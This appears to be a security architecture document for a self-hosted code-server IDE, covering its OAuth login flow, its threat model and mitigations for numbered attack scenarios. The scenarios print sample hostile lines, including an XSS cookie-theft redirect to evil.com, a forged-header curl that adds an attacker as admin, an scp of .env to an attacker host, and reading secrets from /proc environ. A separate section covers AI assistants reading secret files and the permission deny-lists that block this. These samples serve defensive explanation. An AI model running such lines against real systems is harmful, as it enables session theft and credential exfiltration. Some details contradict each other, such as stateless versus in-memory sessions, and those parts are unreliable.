# Something — Security Architecture

Security model, threat analysis, attack vectors, and mitigations.

---

## Reporting a Vulnerability

Found a security issue? **Please report it privately — do not open a public
GitHub issue or PR.**

- **Preferred:** open a private report via this repository's
  **Security → Report a vulnerability** tab
  ([GitHub Private Vulnerability Reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability)).
- We aim to acknowledge within **72 hours** and to ship a fix or mitigation
  before any public disclosure.

This project is **self-hosted**: every deployment runs independently and does
**not** auto-update. A public fix is also a public disclosure for anyone still
running the old code — if you operate a deployment, watch this repository for
security releases and update promptly.

---

## Table of Contents

- [Reporting a Vulnerability](#reporting-a-vulnerability)
- [Security Principles](#security-principles)
- [Defense in Depth](#defense-in-depth)
- [Authentication Flow](#authentication-flow)
- [Threat Model](#threat-model)
- [Attack Vectors & Mitigations](#attack-vectors--mitigations)
- [Security Checklist](#security-checklist)
- [Incident Response](#incident-response)
- [Security Maintenance](#security-maintenance)

---

## Security Principles

The platform is designed with the following security principles:

### 1. **Defense in Depth**
Multiple independent layers of security. If one layer fails, others still protect the system.

### 2. **Zero Trust**
Every request is authenticated and authorized. No implicit trust based on network location.

### 3. **Least Privilege**
Components have minimal permissions. Code-server has no authentication (relies on upstream layers).

### 4. **Fail Secure**
Errors default to denying access, not granting it.

### 5. **Security by Design**
Security is not an afterthought. Every component is designed with security in mind.

---

## Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│ Layer 1: TLS/HTTPS (Caddy)                                      │
│    └─▶ All traffic encrypted in transit                         │
│    └─▶ Automatic certificate renewal (Let's Encrypt)            │
│    └─▶ Modern TLS ciphers only                                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 2: Cryptographic ID Token (Google)                        │
│    └─▶ RS256 signed by Google                                   │
│    └─▶ Verified by auth-service via google-auth-library (JWKS)  │
│    └─▶ aud, iss, exp, email_verified all checked                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 3: Email Whitelist (file-first, env fallback)             │
│    └─▶ Source of truth: PROJECT_DIR/.allowed-emails.json (0600) │
│    └─▶ Managed via the workspace's Team dashboard at runtime    │
│    └─▶ Falls back to IDE_ALLOWED_EMAILS env var pre-bootstrap   │
│    └─▶ entrypoint.sh seeds the file from the env var on first   │
│        boot (first email = admin, the rest = members)           │
│    └─▶ Auth-service caches result for 30s — removals propagate  │
│        within that window                                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 4: Nginx auth_request (Per-Request Verification)          │
│    └─▶ Every IDE request verified by auth-service               │
│    └─▶ Session cookie checked on every request                  │
│    └─▶ Invalid/expired sessions rejected (401)                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 5: Session Cookies (HttpOnly, Secure, SameSite)           │
│    └─▶ HttpOnly: JavaScript cannot access (XSS protection)      │
│    └─▶ Secure: Only sent over HTTPS                             │
│    └─▶ SameSite=Lax: Allows top-level GET nav (bookmarks, links)│
│    └─▶ CSRF blocked: POST /auth/session protected by CORS check │
│    └─▶ 8-hour expiration (automatic cleanup)                    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 6: Application-level session re-verify (workspace-api)    │
│    └─▶ workspace-api parses the ide_session cookie itself       │
│    └─▶ Verifies the JWT against the same SESSION_SECRET that    │
│        auth-service used to sign it                             │
│    └─▶ Cross-checks the resolved email against the X-IDE-User   │
│        header — refuses both on mismatch (fail-closed)          │
│    └─▶ Defense-in-depth against in-container header forgery     │
│        (compromised MCP / extension talking to localhost:3001)  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
                      ┌───────────────┐
                      │  Code-Server  │
                      │  (--auth none)│
                      └───────────────┘
```

### Why No Code-Server Password?

**Decision**: Use `--auth none` instead of `--auth password`

**Rationale**:
1. **Defense in depth is sufficient**
   - 5 layers of protection before reaching code-server
   - If attacker bypasses all 5 layers, they likely have container access
   - With container access, they can read `.env` (password in plaintext)

2. **UX problems with password injection**
   - Code-server checks password client-side (JavaScript)
   - Nginx can only inject server-side (Cookie header)
   - Results in password prompt appearing to user (bad UX)

3. **Industry standard**
   - Most auth_request setups use `--auth none` for the backend
   - Authentication handled by gateway (nginx), not application

**Alternative considered**: Email-based one-time password
- Rejected: Adds complexity, doesn't significantly improve security
- Reason: If all 5 layers fail, email OTP won't help

---

## Authentication Flow

### Login Sequence

```
1. User: Click "Sign in with Google" at https://<YOUR_DOMAIN>
   └─▶ Browser navigates to: GET /auth/google

2. Auth-service: Initiate OAuth
   └─▶ Generate state = crypto.randomBytes(32) — CSRF protection
   └─▶ Generate PKCE: code_verifier + code_challenge (SHA-256)
   └─▶ Store state + code_verifier in memory (TTL: 10 min)
   └─▶ Set state in HttpOnly cookie (SameSite=Lax, 10 min)
   └─▶ Redirect to:
       https://accounts.google.com/o/oauth2/v2/auth
         ?scope=openid+email+profile
         &state=<random>
         &code_challenge=<SHA256(verifier)>
         &code_challenge_method=S256

3. User: Authorize Google account
   └─▶ Google validates identity (password, 2FA, etc.)

4. Google: Redirect back to auth-service
   └─▶ URL: https://<YOUR_DOMAIN>/auth/callback?code=xxxxx&state=xxxxx

5. Auth-service: Verify CSRF state
   └─▶ Timing-safe compare: state param === state cookie
   └─▶ State looked up in memory (single-use — deleted immediately)
   └─▶ If mismatch or expired: redirect /?error=invalid_state

6. Auth-service: Exchange authorization code
   └─▶ POST https://oauth2.googleapis.com/token with code + code_verifier
   └─▶ Gets: id_token (signed RS256 by Google)

7. Auth-service: Verify ID token via google-auth-library
   └─▶ Fetches Google's public JWKS, verifies RS256 signature
   └─▶ Checks: aud === GOOGLE_CLIENT_ID, iss, exp, email_verified === true
   └─▶ If invalid: redirect /?error=invalid_token

8. Auth-service: Check email whitelist
   └─▶ email.toLowerCase() in IDE_ALLOWED_EMAILS (env var, server-side)
   └─▶ If not found: redirect /?error=access_denied

9. Auth-service: Create signed session cookie
   └─▶ jwt.sign({ email, name, picture }, SESSION_SECRET, { expiresIn: 8h })
   └─▶ Set-Cookie: <SESSION_COOKIE_NAME>=<jwt>; HttpOnly; Secure; SameSite=Lax; Max-Age=28800
   └─▶ Redirect to /app/

10. Frontend: On mount, call GET /auth/me
    └─▶ auth-service verifies session JWT, returns { email, name, picture }
    └─▶ No token ever stored in localStorage or URL fragment

11. Browser: All subsequent requests to IDE include session cookie automatically

13. Nginx: Intercept request
    └─▶ Location: / (any request to IDE)
    └─▶ Directive: auth_request /auth/verify
    └─▶ Makes internal subrequest to auth-service

14. Auth-service: Verify session (called by nginx)
    └─▶ GET /auth/verify (internal only)
    └─▶ Extract <SESSION_COOKIE_NAME> cookie
    └─▶ Look up session in memory: sessions.get(token)
    └─▶ Check expiration: session.expiresAt < Date.now()
    └─▶ Return:
        - 200 OK (if valid) → nginx proxies to code-server
        - 401 Unauthorized (if invalid) → nginx returns 401

15. Nginx: Proxy to code-server
    └─▶ URL: http://code-server:8080
    └─▶ Headers:
        - Host: <YOUR_DOMAIN>
        - X-Real-IP: <client-ip>
        - X-Forwarded-For: <client-ip>
        - X-IDE-User: <email> (from auth-service response header)
        - Connection: upgrade (for WebSocket)
        - Upgrade: websocket

16. Code-server: Serve VS Code UI
    └─▶ User sees IDE
    └─▶ Files from /home/coder/project (synced from Google Drive)
```

### Session Management

**Creation**:
- Stateless signed JWT stored in HttpOnly cookie
- Signed with `SESSION_SECRET` (HS256, minimum 32 characters, required at startup)
- Expiration: 8 hours (28800 seconds embedded in JWT)

**Verification** (on every IDE request):
```javascript
// auth-service/index.js
app.get('/auth/verify', (req, res) => {
    const sessionToken = req.cookies[SESSION_COOKIE];
    if (!sessionToken) return res.status(401).send('No session');
    try {
        const payload = jwt.verify(sessionToken, SESSION_SECRET);
        res.setHeader('X-IDE-User', payload.email);
        return res.status(200).send('OK');
    } catch {
        return res.status(401).send('Invalid or expired session');
    }
});
```

**Cleanup**:
- Automatic: JWT expiration enforced cryptographically (no server-side state)
- Manual: DELETE /auth/session (clears cookie)

**Persistence**:
- ✅ Stateless — survives container restarts without invalidating sessions
- No Redis/database needed

---

## Threat Model

### Assets to Protect

1. **Google Drive files** (CRITICAL)
   - Corporate documents, code, sensitive data
   - Synced to `/home/coder/project` in code-server container

2. **User credentials** (CRITICAL)
   - Google OAuth tokens (access_token, refresh_token)
   - Session cookies

3. **System integrity** (HIGH)
   - Code-server container
   - Auth-service container
   - Docker host

4. **Availability** (MEDIUM)
   - IDE uptime
   - Authentication service uptime

### Threat Actors

1. **External attacker** (Internet)
   - Goal: Unauthorized access to IDE and/or Google Drive
   - Capabilities: Network requests, browser attacks

2. **Malicious user** (Internal)
   - Goal: Privilege escalation, access other users' files
   - Capabilities: Valid account, can login

3. **Compromised container**
   - Goal: Lateral movement, data exfiltration
   - Capabilities: Shell access to one container

### Trust Boundaries

```
┌───────────────────────────────────────────────────────────┐
│  UNTRUSTED ZONE (Internet)                                │
│  ├─ User browser                                          │
│  └─ External attackers                                    │
└───────────────────────────────────────────────────────────┘
                       │
                       │ HTTPS (TLS)
                       ▼
┌───────────────────────────────────────────────────────────┐
│  DMZ (Caddy Reverse Proxy)                                │
│  └─ TLS termination, no business logic                    │
└───────────────────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────────────────┐
│  SEMI-TRUSTED ZONE (Frontend Container)                   │
│  ├─ nginx (proxy + auth_request)                          │
│  └─ React SPA (static files)                              │
└───────────────────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────────────────┐
│  TRUSTED ZONE (Backend Containers - Docker Network)       │
│  ├─ auth-service (port 3002 internal)                     │
│  ├─ code-server (port 8080 internal)                      │
│  └─ Google Drive files (rclone sync)                      │
└───────────────────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────────────────┐
│  EXTERNAL DEPENDENCIES (Internet)                         │
│  └─ Google Drive (file storage)                           │
└───────────────────────────────────────────────────────────┘
```

---

## Attack Vectors & Mitigations

### 1. JWT Forgery

**Attack**: Attacker creates fake JWT to impersonate user

**Scenario**:
```
Attacker crafts JWT:
{
  "email": "admin@<YOUR_DOMAIN>",
  "exp": 9999999999,
  "signature": "invalid"
}

Sends to auth-service:
POST /auth/session
Authorization: Bearer <fake-jwt>
```

**Mitigation**:
✅ **Cryptographic verification**
- Google ID token verified via google-auth-library (RS256, public key from Google JWKS)
- `aud`, `iss`, `exp`, `email_verified` all checked
- Signature verification fails if token is tampered with

**Code**: [auth-service/index.js:113-137](./auth-service/index.js#L113-L137)

**Result**: 401 Unauthorized


### 2. Brute Force Attack

**Attack**: Attacker tries many JWT/session combinations

**Scenario**:
```
for i in range(1000000):
    fake_jwt = generate_random_jwt()
    requests.post('/auth/session', headers={'Authorization': f'Bearer {fake_jwt}'})
```

**Mitigation**:
✅ **Rate limiting**
- 30 attempts per 15 minutes per IP (no IP whitelist bypass)
- Implemented with express-rate-limit, applied universally
- Returns 429 Too Many Requests

**Code**: [auth-service/index.js:86-94](./auth-service/index.js#L86-L94)

**Result**: Blocked after 30 attempts


### 3. CORS Bypass

**Attack**: Attacker hosts malicious website that tries to steal session

**Scenario**:
```html
<!-- evil.com -->
<script>
fetch('https://<YOUR_DOMAIN>/auth/session', {
    method: 'POST',
    credentials: 'include', // try to send victim's cookies
    headers: { 'Authorization': 'Bearer <stolen-jwt>' }
})
</script>
```

**Mitigation**:
✅ **Strict CORS whitelist**
- No wildcards (*<YOUR_DOMAIN> ❌)
- Explicit origin check
- Credentials require exact origin match

**Code**: [auth-service/index.js:20-30](./auth-service/index.js#L20-L30)

**Result**: CORS error, request blocked by browser


### 4. XSS Cookie Theft

**Attack**: Attacker injects malicious JavaScript to steal session cookie

**Scenario**:
```javascript
// Malicious script injected into page
document.location = 'https://evil.com/?cookie=' + document.cookie;
```

**Mitigation**:
✅ **HttpOnly cookies**
- JavaScript cannot access cookies
- Cookie only sent by browser automatically

**Code**: [auth-service/index.js:174-181](./auth-service/index.js#L174-L181)

**Result**: `document.cookie` returns empty string (cookie invisible to JS)


### 5. Direct Code-Server Access

**Attack**: Attacker tries to bypass nginx and access code-server directly

**Scenario**:
```bash
# Try to access code-server on port 8080
curl https://<YOUR_DOMAIN>:8080
# or
curl http://203.0.113.10:8080
```

**Mitigation**:
✅ **No expose directive**
- Port 8080 not in docker-compose ports mapping
- Only accessible via Docker network (internal)
- Caddy only routes to frontend:3001 (not code-server)

**Code**: [docker-compose.yml:2-17](./docker-compose.yml#L2-L17)

**Result**: Connection refused (port not open to Internet)


### 6. Nginx Bypass

**Attack**: Attacker tries to access auth-service directly

**Scenario**:
```bash
# Try to access auth-service on port 3002
curl https://<YOUR_DOMAIN>:3002/auth/session
```

**Mitigation**:
✅ **No expose directive**
- Port 3002 not in docker-compose ports mapping
- Only accessible via Docker network (frontend → auth-service)
- Caddy only routes to frontend:3001

**Code**: [docker-compose.yml:19-30](./docker-compose.yml#L19-L30)

**Result**: Connection refused


### 7. Session Hijacking

**Attack**: Attacker steals victim's session cookie and uses it

**Scenario**:
```
1. Victim uses public WiFi (unencrypted)
2. Attacker sniffs network traffic
3. Attacker extracts <SESSION_COOKIE_NAME> cookie
4. Attacker uses cookie to access IDE
```

**Mitigation**:
✅ **Secure cookies (HTTPS only)**
- Cookie only sent over encrypted connection
- Not sent over HTTP (even if attacker downgrades)

✅ **8-hour expiration**
- Even if stolen, cookie expires
- Automatic cleanup of expired sessions

**Code**: [auth-service/index.js:174-181](./auth-service/index.js#L174-L181)

**Result**: Cookie not exposed to network sniffing (TLS encryption)


### 8. Container Compromise

**Attack**: Attacker exploits vulnerability in nginx to gain shell access

**Scenario**:
```
1. CVE-2021-23017 (nginx DNS resolver buffer overflow)
2. Attacker sends malicious HTTP request
3. Nginx crashes and spawns shell
4. Attacker has root access to frontend container
5. Attacker runs: curl http://code-server:8080
6. Gets full IDE access (bypasses all auth)
```

**Mitigation**:
⚠️ **Low probability**
- Requires known CVE in nginx (rare, ~1-2 per year)
- Requires targeting this deployment specifically
- Most CVEs don't have public exploits

✅ **Regular updates**
- Use official images: `nginx:alpine`, `caddy:latest`
- Docker Hub auto-rebuilds on base image updates
- Hetzner automatically updates system packages

✅ **Defense in depth still protects**
- Even with container access, attacker cannot:
  - Access auth-service memory from another container
  - Forge session tokens (SESSION_SECRET not accessible from code-server container)
  - Modify authentication logic (auth-service is separate container)

⚠️ **Limitation**:
- If attacker compromises frontend container, they CAN:
  - Access code-server directly (http://code-server:8080)
  - Read Google Drive files of the CURRENT session
  - NOT access other users' sessions (sessions in auth-service memory)

**Why code-server password wouldn't help**:
- With container access, attacker can: `cat /proc/$(pidof code-server)/environ`
- Reads all environment variables (including `CODE_SERVER_PASSWORD`)
- Password stored in plaintext in `.env` and process memory

**Result**: Accept risk (low probability), maintain defense in depth


### 9. Whitelist Bypass

**Attack**: Attacker tries to access IDE without being on whitelist

**Scenario**:
```
1. Attacker creates Google account: attacker@gmail.com
2. Completes Google OAuth flow
3. Tries to access IDE
```

**Mitigation**:
✅ **Server-side whitelist check (IDE_ALLOWED_EMAILS)**
- Auth-service checks email against `IDE_ALLOWED_EMAILS` env var after ID token verification
- Whitelist is server-side only — never exposed to client
- No external service dependency; cannot be bypassed via misconfiguration
- Only whitelisted emails can create sessions

**Code**: [auth-service/index.js:146-165](./auth-service/index.js#L146-L165)

**Result**: 403 Forbidden (not on whitelist)


### 10. Replay Attack

**Attack**: Attacker intercepts JWT and reuses it later

**Scenario**:
```
1. Victim logs in (JWT issued with exp=1234567890)
2. Attacker intercepts JWT (MITM or XSS)
3. Attacker uses JWT before expiration
```

**Mitigation**:
✅ **Google ID token never stored**
- ID token is verified once on `/auth/callback` and discarded
- Token never reaches the browser or gets stored anywhere

✅ **Session cookies**
- Subsequent requests use HttpOnly session cookie
- Session can be invalidated via logout

**Code**: [auth-service/index.js:211-218](./auth-service/index.js#L211-L218)

**Result**: Attack possible within JWT expiration window, but limited damage


### 11. SQL Injection (Whitelist Check)

**Attack**: Attacker injects SQL in email field

**Scenario**:
```
Email in JWT: admin@<YOUR_DOMAIN>' OR '1'='1
```

**Mitigation**:
✅ **No SQL involved**
- Whitelist is a Set in memory (`IDE_ALLOWED_EMAILS` env var)
- Comparison is `Set.has(email)` — no query construction possible

**Code**: [auth-service/index.js:148-155](./auth-service/index.js#L148-L155)

**Result**: Email treated as literal string, not SQL


### 12. DoS (Session Memory Exhaustion)

**Attack**: Attacker creates many sessions to exhaust memory

**Mitigation**:
✅ **Stateless sessions**
- Sessions are signed JWTs stored in the client cookie — no server-side state
- No in-memory store means no RAM exhaustion vector
- Each session is independently verifiable from the cookie alone

**Result**: Not applicable — stateless architecture eliminates this attack vector


### 13. GraphQL Injection (Shopify MCP)

**Attack**: Attacker injects malicious strings into Shopify GraphQL queries via MCP tool arguments

**Scenario**:
```
get_order(id: 'x"){ maliciousField } query Exfil{ shop{ name }}'
→ Injected into: { order(id: "x") { maliciousField } ... }
```

**Mitigation**:
✅ **Parameterized GraphQL variables**
- All queries use named variables (`$id: ID!`, `$query: String`, etc.)
- User input never interpolated into query strings
- Variables are transmitted as separate JSON, not part of the query syntax

**Code**: [apps/shopify-mcp/index.js](../ide-template/apps/shopify-mcp/index.js)

**Result**: Input treated as opaque value, never parsed as GraphQL syntax


### 15. Process List Token Exposure (Telegram Bot)

**Attack**: Any user with shell access reads `ps aux` and captures the Telegram bot token from the process command line

**Scenario**:
```bash
ps aux | grep claude
# → claude --dangerously-skip-permissions TELEGRAM_BOT_TOKEN=1234567890:AAF...
```

**Mitigation**:
✅ **Token written to file, not passed as CLI argument**
- Token written to `~/.claude/channels/telegram/.env` at startup
- tmux command does not include the token in its argument string

**Code**: [entrypoint.sh](../ide-template/entrypoint.sh), [bot/bot.sh](../ide-template/bot/bot.sh)

**Result**: Token not visible in process list


### 16. SSH MITM During Deployment

**Attack**: Attacker intercepts SSH connection during deploy (e.g., café WiFi, BGP hijack) and receives secrets sent via `scp`

**Scenario**:
```bash
scp -o StrictHostKeyChecking=no .env attacker-ip:/path
# Host key not verified → MITM possible
```

**Mitigation**:
✅ **`StrictHostKeyChecking=accept-new`**
- Trusts new hosts on first connection (key stored in `~/.ssh/known_hosts`)
- Rejects if host key changes on subsequent deployments
- Changed host key = connection refused + warning

**Code**: [clients/*/deploy.sh](../clients/)

**Result**: MITM detected on any deployment after the first


### 17. Identity Header Spoofing

**Attack**: Client sends a crafted `X-IDE-User` header to impersonate another user, OR something inside the code-server container talks to workspace-api on localhost:3001 with a forged header.

**Scenario A** — external client:
```
GET / HTTP/1.1
X-IDE-User: admin@company.com
```

**Scenario B** — in-container forgery (e.g. compromised MCP server, malicious VS Code extension):
```bash
curl localhost:3001/api/team -X POST \
  -H 'X-IDE-User: admin@company.com' \
  -d '{"email":"attacker@evil.com","role":"admin"}'
```

**Mitigation**:
✅ **Caddy + nginx strip client-supplied identity headers before upstream**
```
header_up -X-IDE-User      # Caddy
proxy_set_header X-IDE-User $ide_user;   # nginx — overwrites with auth-service value
```

✅ **workspace-api re-verifies the session JWT itself**
- `lib/auth.js` reads the `ide_session` cookie, verifies the JWT against the same `SESSION_SECRET` auth-service used to sign it.
- The actor email is set from the JWT claim, not from the header.
- If a header IS present and disagrees with the cookie, both are dropped (fail-closed) and a stderr warning is logged.
- This means an in-container forgery has to also forge a valid signed JWT — which requires `SESSION_SECRET`, which lives only in env (not in PROJECT_DIR or any volume readable by the bot).

**Code**:
- [Caddyfile](../ide-template/Caddyfile)
- [ide-template/frontend/nginx.conf](../ide-template/frontend/nginx.conf)
- [ide-template/workspace-api/lib/auth.js](../ide-template/workspace-api/lib/auth.js)

**Result**: Header spoofing alone fails on both ingress (Caddy/nginx strip) and at the application layer (cookie/header mismatch → request runs as anonymous, admin gates reject).


### 19. AI Assistant Access to Secrets

**Attack**: An AI coding assistant (e.g. Claude Code) reads `.env` files during a session, exposing all secrets to the assistant provider's servers.

**Scenario**:
```
1. Developer asks Claude Code to help debug a deployment
2. Claude reads clients/client-ide/.env to understand the config
3. All secrets (Telegram token, OAuth secrets, API keys)
   are now part of the conversation sent to Anthropic servers
4. Data retained for up to 30 days (or 5 years on consumer plans with training opt-in)
```

**Mitigation**:
✅ **Never read `.env` or `.email/accounts.json` directly in AI sessions**
- Use `./rotate.sh` for secret rotation — runs entirely locally, no AI involved
- Show AI assistants logs and errors, not `.env` / `accounts.json` contents
- If AI reads either, rotate all secrets in that file immediately

✅ **AI tool deny-list** (`.claude/settings.json`)
- `Read(**/.env)` and `Read(**/.env.local)` blocked at the Claude Code permission layer
- `Read(**/.email/accounts.json)` blocked — IMAP App Passwords never enter AI context
- Defense-in-depth: prevents accidental reads even if a session goes off-script

✅ **Declarative tool allow-list** (`~/.claude/settings.json`)
- `permissions.allow: ["mcp__*", "Read", "Bash", "Glob", "Grep", "Write", "Edit"]` — only listed patterns run without prompting; `mcp__*` covers all MCP-namespaced tools but stays scoped to *that* namespace, so a hypothetical non-MCP tool wouldn't auto-pass
- `defaultMode: "acceptEdits"` for the edit-class tools; everything else falls through to the prompt path
- Both bot.sh and `workspace-api/lib/claude.js` pass `--dangerously-skip-permissions` for non-interactive operation, but the allow-list remains the secure source of truth — `claude.js` does NOT auto-approve incoming `permission_request` events; it logs them so missing entries can be added to `permissions.allow` deliberately rather than blanket-bypassed

✅ **`rotate.sh` — local-only rotation tool**
- Auto-generates `SESSION_SECRET` and `CODE_SERVER_PASSWORD` via `openssl rand`
- Prompts interactively for external service keys
- Updates `.env` in-place using Python (handles special characters)
- No network calls, no AI involvement

✅ **Email App Passwords are revocable independently**
- Gmail App Password / Zoho App-specific Password is a separate credential from main account login
- Revoke via the provider's UI without touching main account password
- If `accounts.json` ever leaks, revoke the App Passwords — main account access unaffected

```bash
cd clients/client-ide && ./rotate.sh
```

✅ **Understand your AI assistant's data policy**
- Consumer plans (Free/Pro/Max): data may be used for model training (opt-out available)
- API/Enterprise plans: no training by default, 30-day retention
- Zero Data Retention available on Enterprise (must be enabled per-org)

**Result**: Rotate all secrets exposed in any AI session immediately


### 19. Encrypted Credential Store — Backup Confidentiality

**Attack**: Attacker exfiltrates a restic snapshot from the B2 bucket and decrypts every credential the workspace ever stored (Claude OAuth, Shopify, Meta, Google Ads, GA4, IMAP).

**Scenario**:
```
1. Attacker compromises ~/.workspace-admin/restic.env on the Hetzner host
   (or the B2 application key it points at).
2. Pulls every snapshot from the B2 bucket.
3. If the AES-256-GCM master key is in the snapshot, decrypts every blob.
   → Year-long Claude token, all integration tokens, all in plaintext.
```

**Mitigation**:
✅ **Master key NEVER goes into a snapshot**
- `restic-backup.sh` removed `/srv/<ide>/secrets/` from PATHS entirely.
- Belt-and-braces excludes: `--exclude '**/integrations.key'` and `--exclude '**/secrets/**'` so a future drift in PATHS still can't sneak the key in.
- The encrypted blobs (`.platform.token.enc`, `.integrations/*.enc`) ARE in snapshots, but without the key they're random bytes — restic itself adds another encryption layer on top (`RESTIC_PASSWORD`).

✅ **Defence-in-depth pricing model**
- B2 bucket compromised but key not exfiltrated → ciphertexts unrecoverable (need master key).
- Master key compromised but bucket not exfiltrated → useless without ciphertexts.
- Both compromised → game over, but two independent breaches required.

✅ **Recovery posture**
- Lose the master key: every user re-runs the wizard / Integrations dashboard. No data loss in the workspace itself, only credentials.
- Lose the bucket: lose backup history, but live system unaffected.

**Code**:
- [ide-template/scripts/restic-backup.sh](../ide-template/scripts/restic-backup.sh)
- [ide-template/workspace-api/lib/integrations/crypto.js](../ide-template/workspace-api/lib/integrations/crypto.js)

**Result**: A single compromise vector (B2 key OR host shell, not both) is not sufficient to read any credential.

### 19a. Encryption Scope — What "At Rest" Actually Buys

**Updated 2026-05-12 (Phase 2 broker + Phase 3 bot-uid + Phase 1.5 egress-proxy deployed).** The credential store is now **encrypted at rest AND during execution**. The 2026-05-09 audit's headline finding (bot reads AES key + cross-MCP credential leak via `/proc/<pid>/environ`) is closed. Validated end-to-end on the canary client through every architectural pivot below.

#### Four uids inside the container

| uid | name | Role | What it can read |
|---|---|---|---|
| 1000 | `coder` | code-server + terminal sessions | PROJECT_DIR (group `workspace`). **Cannot** read AES key, encrypted store, broker UDS, bot's `~/.claude/.credentials.json`, `~/.<bot>/integrations.env`, or any uid-1001/1002/1003 process's `/proc/<pid>/environ`. |
| 1001 | `wsapi` | workspace-api | AES master key, encrypted store. Decrypts on demand. |
| 1002 | `mcp` | every node MCP subprocess | Only its own credentials, fetched via the broker UDS using a per-spawn nonce. |
| 1003 | `bot` | tmux Claude + Telegram plugin + plugin-style MCPs | Bot home (`/home/bot/`) with Claude OAuth + integrations.env. **Cannot** read AES key, encrypted store, broker UDS, or coder/wsapi/mcp `/proc/<pid>/environ`. |

Three groups bridge the uids:
- `workspace` (1100) — coder + wsapi + mcp + bot — shared PROJECT_DIR rw.
- `wsapi-broker` (1101) — wsapi + mcp only — broker UDS access. Coder + bot are NOT in this group → cannot connect.
- `botshare` (1102) — wsapi + bot only — `/home/bot/` credentials. Coder is NOT in this group → cannot read bot's secrets.

#### Broker protocol

In-process broker inside `workspace-api`:
- UDS at `/var/wsapi-store/run/broker.sock`, mode `srw-rw---- group=wsapi-broker`.
- Line-of-JSON protocol: `{op:"get", integrationId, nonce}` → `{ok:true, fields|items}`.
- `runtime.js` issues a 32-byte random nonce per MCP spawn, registered for that integration only. MCP at uid 1002 calls broker over UDS, gets fields, populates `process.env`, then immediately deletes `BROKER_NONCE` from `process.env` to narrow the cross-mcp `/proc` theft window.
- Grants are **multi-use within a 24-hour TTL** — required because Claude lazy-spawns MCPs and re-spawns after crashes with the same nonce. The original "single-use, 30-second TTL" design (still in the audit doc) was tightened on paper but loose in practice — every broker-mediated MCP was failing silently. The 24h multi-use grant binds to `integrationId` so a sibling MCP that scraped a nonce from `/proc` can only impersonate the same integration's MCP — sibling-of-different-integration impersonation remains an accepted residual risk (audit re-evaluation 2026-05-11: uid isolation is the load-bearing control, not nonce uniqueness).

#### Setuid wrappers

Four ~50-80-line C programs in `ide-template/setuid-wrappers/`, compiled in-image, mode 4755 root-owned:
- `wsapi-runner` — drops to uid 1001, exec's `node /opt/ide/workspace-api/index.js`. Invoked by PM2. **Does NOT set `PR_SET_NO_NEW_PRIVS`** — see "NoNewPrivs asymmetry" below.
- `bot-runner` — drops to uid 1003, exec's `/opt/ide/bot.sh`. Invoked by PM2. **Does NOT set `PR_SET_NO_NEW_PRIVS`** — same reason.
- `mcp-runner` — drops to uid 1002, exec's `node /opt/ide/apps/<id>-mcp/index.js`. Invoked by Claude per `mcpServers` config. Sets `PR_SET_NO_NEW_PRIVS`.
- `monitor-runner` — drops to uid 1003 (`bot`), exec's a whitelisted script under `/opt/ide/`. Invoked by PM2 for `bot-reminders`, `bot-snapshot`, `bot-browser-watchdog`. Sets `PR_SET_NO_NEW_PRIVS`.
- All four call `initgroups()` before `setuid` so supplementary groups stick.
- All four refuse to run if their own setuid bit was lost (catches deploy regressions).

##### NoNewPrivs asymmetry

`mcp-runner` + `monitor-runner` are **terminal** — they exec processes that never need to spawn another setuid binary. NoNewPrivs is pure defence-in-depth there. `wsapi-runner` + `bot-runner` are **orchestrators** — they exec `node workspace-api` / `bash bot.sh`, which in turn spawn claude, which spawns mcp-runner. PR_SET_NO_NEW_PRIVS inherits down the whole tree; the kernel then refuses every subsequent setuid exec, including mcp-runner's own setuid drop. The result is broker-mediated MCPs silently failing to load credentials (caught on bot-runner originally during a 2026-05-11 incident, and again on wsapi-runner 2026-06-04).

**Residual risk this leaves:** wsapi-process and bot-process CAN exec setuid binaries. Realistic threats remain bounded:
- exec `mcp-runner` — argv validated against `[a-z0-9-]{1,32}`; only resolves to `/opt/ide/apps/<id>-mcp/index.js` files in the image. No path traversal.
- exec `bot-runner` — hardcoded `/opt/ide/bot.sh`; no arg passthrough that influences what runs.
- exec `monitor-runner` — script path against whitelist.
- exec `sudo` — NOPASSWD stripped; prompts for password the process doesn't have.
- exec other system setuid binaries — none confer extra access against the mode 0640 botshare-gated files (encryption key, encrypted store, bot creds).

The privilege drop above (setgid+setuid to the target uid) is the load-bearing security control; NoNewPrivs was belt-and-braces that broke a load-bearing feature when set on orchestrators.

#### Threat coverage matrix

Validated on the canary client 2026-05-09 (commit `994172a`):

| Vector | Pre-Phase-2 | Post-Phase-2 |
|---|---|---|
| Bot reads `/run/secrets/integrations.key` | open | **blocked** (mode 0400 owner=wsapi 1001) |
| Bot reads `/var/wsapi-store/credentials.json` | open | **blocked** (mode 0700 owner=wsapi 1001) |
| Bot connects to broker UDS | n/a | **blocked** (parent dir mode 2770 group=wsapi-broker, coder not in group) |
| Bot reads workspace-api `/proc/<pid>/environ` | open (same uid) | **blocked** (uid 1001 ≠ 1000) |
| Bot reads MCP `/proc/<pid>/environ` | open (same uid) | **blocked** (uid 1002 ≠ 1000) |
| MCP-A reads MCP-B `/proc/<pid>/environ` to steal sibling creds | open | **blocked** (BROKER_NONCE consumed at startup; single-use grants reject reuse) |
| Bot escalates via NOPASSWD sudo | open | **blocked** (sudoers entry stripped in Dockerfile) |
| Bot exfils credentials over the network | open | **blocked** (egress-proxy sidecar enforces hostname-level CONNECT filter; code-server lives on `bot-net` with `internal: true` so direct TCP is impossible at the Docker network layer — see § Egress filtering below) |

#### Residual risks (separate follow-ups, NOT closed by Phase 2/3)

